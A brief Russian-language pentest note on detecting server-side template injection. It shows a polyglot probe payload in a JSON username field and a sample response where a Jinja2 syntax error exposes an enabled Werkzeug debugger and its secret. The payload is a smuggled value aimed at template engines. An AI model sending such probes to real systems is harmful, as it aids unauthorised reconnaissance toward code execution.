вставка для проверки веба Пример:
```js
{
"username":"${{<%[%'\"}}%\\."
}
```
после анализ ответа
пример:
```http
HTTP/1.1 200 OK
Date: Tue, 04 Nov 2025 10:22:39 GMT
Server: Apache/2.4.52 (Ubuntu)
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
ETag: W/"4f34-qjiSQ+kwd9oBJxWaa/tHpWsccv0-gzip"
Vary: Accept-Encoding
Content-Length: 20276
Connection: close

<!doctype html>
<html lang=en>

<head>
    <title>jinja2.exceptions.TemplateSyntaxError: unexpected &#39;&lt;&#39;
        // Werkzeug Debugger</title>
    <link rel="stylesheet" href="?__debugger__=yes&amp;cmd=resource&amp;f=style.css">
    <link rel="shortcut icon" href="?__debugger__=yes&amp;cmd=resource&amp;f=console.png">
    <script src="?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js"></script>
    <script>
        var CONSOLE_MODE = false,
            EVALEX = true,
            EVALEX_TRUSTED = false,
            SECRET = "kvoN017Uzpjw6TTDu2w5";
    </script>
</head>
```
здесь используется jinja2 в связке с включенным дебагером